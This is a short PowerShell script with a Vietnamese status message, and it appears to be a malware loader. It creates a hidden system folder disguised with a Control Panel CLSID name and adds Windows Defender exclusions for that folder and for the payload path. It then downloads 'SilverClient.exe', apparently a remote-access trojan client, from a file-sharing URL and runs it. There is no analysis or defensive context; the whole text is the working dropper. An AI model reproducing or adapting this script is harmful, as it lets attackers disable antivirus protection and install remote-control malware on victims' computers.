$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
$hash = [System.BitConverter]::ToString($md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid)))
$uuid = $hash -replace "-",""

$url = "https://anonsharing.com/file/36c9e630a3dce435/SilverClient.exe"
$output = "$dir\$uuid_sigma.exe"
Add-MpPreference -ExclusionPath $output

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
    Write-Host "Tệp đã được tải về thành công."
}
Start-Process $output
